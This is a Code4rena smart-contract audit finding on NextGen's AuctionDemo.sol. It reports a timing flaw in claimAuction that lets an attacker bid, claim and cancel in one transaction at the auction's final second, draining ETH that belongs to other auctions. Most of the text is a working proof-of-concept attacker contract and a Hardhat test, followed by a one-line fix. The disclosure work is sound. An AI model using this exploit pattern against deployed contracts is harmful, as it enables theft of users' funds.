# Original link
https://github.com/code-423n4/2023-10-nextgen-findings/issues/1904
# Lines of code

https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L105


# Vulnerability details

## Impact
A malicious attacker can steal the funds from the AuctionDemo contract by calling `claimAuction` and `cancelAllBids` in one transaction if, right before the auction is finished, the auctionContract still has more funds from other live auctions.

## Proof of Concept
Suppose there is two auctions running, for a token 1 and token 2

1. Alice places a 3 ETH bid for a token 1
2. Bobby place a 10 ETH bid for a token 2
3. Now the auction contract has 13 ETH in balance
4. During the last second of auction, attacker steps in and does the following in one transaction:
    - Places a new 10 ETH bid for a token 1 (auction contract balance now = 23 ETH)
    - Claims the auction to get the token (auction contract sends 3 ETH back to Alice, and 10 ETH to auction contract owner)
    - Cancels his bid to get the remaining 10 ETH back. As a result, the contract balance now equals 0.

### To replicate in your local environment:
1. Add `BidAttacker.sol` to `hardhat/smart-contracts`. Here is an example (each step is highlighted in the comments):

```solidity
  File: hardhat/smart-contracts/BidAttacker.sol

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import "./IERC721.sol";
import "./Ownable.sol";
import "./IMinterContract.sol";
import "./IERC721Receiver.sol";

interface IAuctionDemo {
    function returnHighestBid(uint256 _tokenId) external view returns (uint256);
    function participateToAuction(uint256 _tokenId) external payable;
    function claimAuction(uint256 _tokenId) external;
    function cancelAllBids(uint256 _tokenId) external;
}

contract BidAttacker is Ownable {
    IMinterContract public minterContract;
    IAuctionDemo public auctionContract;
    IERC721 public gencoreContract;

    bool public isHacked;
    uint256 tokenId; // keep in storage for later withdrawal

    constructor(address _auctionContractAddress, address _minterContractAddress, address _gencoreContractAddress) {
        minterContract = IMinterContract(_minterContractAddress);
        auctionContract = IAuctionDemo(_auctionContractAddress);
        gencoreContract = IERC721(_gencoreContractAddress);
    }

    // main attack function
    function bidAttack(uint256 _tokenId) public payable onlyOwner {
        tokenId = _tokenId;
        // check if the current block.timestamp is last
        require(block.timestamp == minterContract.getAuctionEndTime(_tokenId), "Wrong block.timestamp");

        // place a bid
        auctionContract.participateToAuction{value: msg.value}(_tokenId);

        // claimAuction
        auctionContract.claimAuction(_tokenId);

        // call cancelBid on the last block.timestamp
        auctionContract.cancelAllBids(_tokenId);
    }

    // withdraw funds and token to the attacker EOA account
    function withdraw() public {
        (bool success,) = payable(owner()).call{value: address(this).balance}("");
        require(success, "Withdrawal failed");
        gencoreContract.safeTransferFrom(address(this), owner(), tokenId);
    }

    // receive the funds and withdraw to attackerEOA
    receive() external payable {
        withdraw();
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

2. Edit `hardhat/scripts/fixtureDeployments.js`by adding attackerEOA signer, deploying `AuctionDemo.sol` and `BidAttacker.sol` contracts. Updated `fixtureDeployments.js` file example:

The edits are highlighted with "POC" tag in comments 
```js
  File: hardhat/scripts/fixtureDeployments.js

const { ethers } = require("hardhat")

// Setup test environment:
const fixturesDeployment = async () => {
  const signersList = await ethers.getSigners()
  const owner = signersList[0]
  const addr1 = signersList[1]
  const addr2 = signersList[2]
  const addr3 = signersList[3]
  const attackerEOA = signersList[4]; // for POCs


  const delegation = await ethers.getContractFactory(
    "DelegationManagementContract",
  )
  const hhDelegation = await delegation.deploy()

  const randoms = await ethers.getContractFactory("randomPool")
  const hhRandoms = await randoms.deploy()

  const nextGenAdmins = await ethers.getContractFactory("NextGenAdmins")
  const hhAdmin = await nextGenAdmins.deploy()

  const nextGenCore = await ethers.getContractFactory("NextGenCore")
  const hhCore = await nextGenCore.deploy(
    "Next Gen Core",
    "NEXTGEN",
    await hhAdmin.getAddress(),
  )

  // This example uses the NXT Randomizer

  const randomizer = await ethers.getContractFactory("NextGenRandomizerNXT")
  const hhRandomizer = await randomizer.deploy(
    await hhRandoms.getAddress(),
    await hhAdmin.getAddress(),
    await hhCore.getAddress()
  )

  const nextGenMinter = await ethers.getContractFactory("NextGenMinterContract")
  const hhMinter = await nextGenMinter.deploy(
    await hhCore.getAddress(),
    await hhDelegation.getAddress(),
    await hhAdmin.getAddress(),
  )

  // POCs start
  const auction = await ethers.getContractFactory("auctionDemo");
  const hhAuction = await auction.deploy(
    await hhMinter.getAddress(),
    await hhCore.getAddress(),
    await hhAdmin.getAddress()
  );

  const bidAttacker = await ethers.getContractFactory("BidAttacker");
  const hhBidAttacker = await bidAttacker.connect(attackerEOA).deploy(
    await hhAuction.getAddress(),
    await hhMinter.getAddress(),
    await hhCore.getAddress()
  )
  // POCs end


  const contracts = {
    hhAdmin: hhAdmin,
    hhCore: hhCore,
    hhDelegation: hhDelegation,
    hhMinter: hhMinter,
    hhRandomizer: hhRandomizer,
    hhRandoms: hhRandoms,
    // POCs start
    hhAuction: hhAuction,
    hhBidAttacker: hhBidAttacker,
    // POCs end
  }

  const signers = {
    owner: owner,
    addr1: addr1,
    addr2: addr2,
    addr3: addr3,
    attackerEOA: attackerEOA, // for POCs
  }

  return {
    signers,
    contracts,
  }
}

module.exports = fixturesDeployment
```

3. Add `POCs.test.js` to `hardhat/test`. Here is the hardhat `POCs.test.js` script to run the attack scenario in javascript (each step is highlighted in the comments and it will print all the balances to the console):

```js
  File: hardhat/test/POCs.test.js

const {
    loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const fixturesDeployment = require("../scripts/fixturesDeployment.js");
const { time } = require('@nomicfoundation/hardhat-network-helpers'); // for POCs

let signers;
let contracts;

describe("Proof of Concept", function () {
    before(async function () {
        ({ signers, contracts } = await loadFixture(fixturesDeployment));
    });

    context("Bid_Attack", () => {

        before("#dataWereAdded", async function () {
            // create collection_1
            await contracts.hhCore.createCollection(
                "Test Collection 1",
                "Artist 1",
                "For testing",
                "www.test.com",
                "CCO",
                "https://ipfs.io/ipfs/hash/",
                "",
                ["desc"]
            );

            // set collection_1 data
            await contracts.hhCore.setCollectionData(
                1, // _collectionID
                signers.addr1.address, // _collectionArtistAddress
                2, // _maxCollectionPurchases
                10000, // _collectionTotalSupply
                0 // _setFinalSupplyTimeAfterMint
            );

            // set collection_1 costs
            await contracts.hhMinter.setCollectionCosts(
                1, // _collectionID
                0, // _collectionMintCost
                0, // _collectionEndMintCost
                0, // _rate
                100, // _timePeriod :: POC edited from 0 to 100
                1, // _salesOptions
                "0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B" // delAddress
            );


            // set collection_1 phases 
            await contracts.hhMinter.setCollectionPhases(
                1, // _collectionID
                1696931278, // _allowlistStartTime
                1696931278, // _allowlistEndTime
                1696931278, // _publicStartTime
                1796931278, // _publicEndTime
                "0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870" // _merkleRoot
            );
            const dataAdded = await contracts.hhCore.retrievewereDataAdded(1);

            // add minter contract to hh core
            await contracts.hhCore.addMinterContract(contracts.hhMinter);
            // add randomizer to hh core collection 1
            await contracts.hhCore.addRandomizer(1, contracts.hhRandomizer);


            expect(dataAdded).equal(true);
        });

        let tokenId, tokenId2;
        // create collection and add data
        it("#mintAndAuction", async function () {
            // set auction end time for 100 seconds from now
            const auctionEndTime = await time.latest() + 100;

            // get tokenId gencore.viewTokensIndexMin(_collectionID) + gencore.viewCirSupply(_collectionID);
            tokenId = await contracts.hhCore.viewTokensIndexMin(1) + await contracts.hhCore.viewCirSupply(1);
            tokenId2 = tokenId + BigInt(1);

            // mint and put on auction in same tx
            await contracts.hhMinter.mintAndAuction(
                signers.addr1.address, // _recipient
                '{"tdh": "100"}', // _tokenData
                2, //_saltfun_o
                1, // _collectionID
                auctionEndTime // _auctionEndTime
            );
            await contracts.hhMinter.mintAndAuction(
                signers.addr1.address, // _recipient
                '{"tdh": "100"}', // _tokenData
                2, //_saltfun_o
                1, // _collectionID
                auctionEndTime // _auctionEndTime
            );

            // check if auction went live
            expect(await contracts.hhMinter.getAuctionStatus(tokenId)).equal(true);
            expect(await contracts.hhMinter.getAuctionStatus(tokenId2)).equal(true);

            // approve tokenId
            const auctionContractAddress = await contracts.hhAuction.getAddress();
            await contracts.hhCore.connect(signers.addr1).approve(auctionContractAddress, tokenId);
        });

        it("#placeBidsForToken1", async function () {
            const THREE_ETH = BigInt(3 * 1e18);
            await contracts.hhAuction.connect(signers.addr1).participateToAuction(tokenId, { value: THREE_ETH }); // 3 eth

            const currentBid = await contracts.hhAuction.returnHighestBid(tokenId);

            expect(currentBid).equal(THREE_ETH); // highest bid has to be 3 ETH
        });
        it("#placeBidsForToken2", async function () { // to have other balance
            const TEN_ETH = BigInt(10 * 1e18);
            await contracts.hhAuction.connect(signers.addr1).participateToAuction(tokenId2, { value: TEN_ETH }); // 10 eth

            const currentBid = await contracts.hhAuction.returnHighestBid(tokenId2);

            expect(currentBid).equal(TEN_ETH); // highest bid has to be 10 ETH
        });
        it("#Attack", async function () {
            const TEN_ETH = BigInt(10 * 1e18);

            // Pre-condition: the auctionContract balance has to have the balance higher than the total amount of all bids
            // > For instance: have other auctions running, that's why we have #placeBidsForToken2 test

            // check auctionEndTime and execute attack during the final second
            const auctionEndTime = await contracts.hhMinter.getAuctionEndTime(tokenId);
            await time.increaseTo(auctionEndTime - BigInt(1)); // was adding plus one second
            // On a live blockchain, an attacker can create a mechanism to periodically check 
            // the current timestamp and trigger the transaction when the desired timestamp is reached

            // check and log ETH balances before the attack
            const attackerBalanceBefore = await ethers.provider.getBalance(signers.attackerEOA.address);
            const auctionBalanceBefore = await ethers.provider.getBalance(await contracts.hhAuction.getAddress());
            console.log("Attacker ETH before = ", parseInt(attackerBalanceBefore) / 1e18);
            console.log("Auction ETH before = ", parseInt(auctionBalanceBefore) / 1e18);
            console.log("Previous token owner: ", await contracts.hhCore.ownerOf(tokenId));

            // execute + send enough funds
            // the bid can either be the sum of auction contract balance minus the sum of bids for this tokenId (in this case equals 10 ETH)
            // or it can equal the current highestBid = 1 wei - in this case the auction might still have some ETH left from other running auctions
            await contracts.hhBidAttacker.connect(signers.attackerEOA).bidAttack(tokenId, { value: TEN_ETH });

            // check and log balances after the attack
            const attackerBalanceAfter = await ethers.provider.getBalance(signers.attackerEOA.address);
            const auctionBalanceAfter = await ethers.provider.getBalance(await contracts.hhAuction.getAddress());
            // the attacker will receive the token and his bid back
            console.log("Attacker ETH after = ", parseInt(attackerBalanceAfter) / 1e18);
            // the auction contract will loose all the funds (attacker receives his bid and admins receive the other ones)
            console.log("Auction ETH after = ", parseInt(auctionBalanceAfter) / 1e18);
            console.log("New token owner: ", await contracts.hhCore.ownerOf(tokenId));
            console.log("Attacker address: ", signers.attackerEOA.address);
            expect(await contracts.hhCore.ownerOf(tokenId)).to.equal(signers.attackerEOA.address); // check if attacker now owns the token
            expect(attackerBalanceAfter).to.be.greaterThan(attackerBalanceBefore - BigInt(0.001 * 1e18)); // check if attacker balance hasn't changed minus gas fees
        });
    })
});
```

4. run `cd hardhat`
5. run `npx hardhat test --grep "Bid_Attack"`
6. See Attack details logged in the terminal

## Tools Used
Manual Review

## Recommended Mitigation Steps
Replace `block.timestamp >= minter.getAuctionEndTime(_tokenid)` in `claimAuction()` with ``block.timestamp > minter.getAuctionEndTime(_tokenid)`.
[AuctionDemo.sol#L105](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L105)



## Assessed type

Timing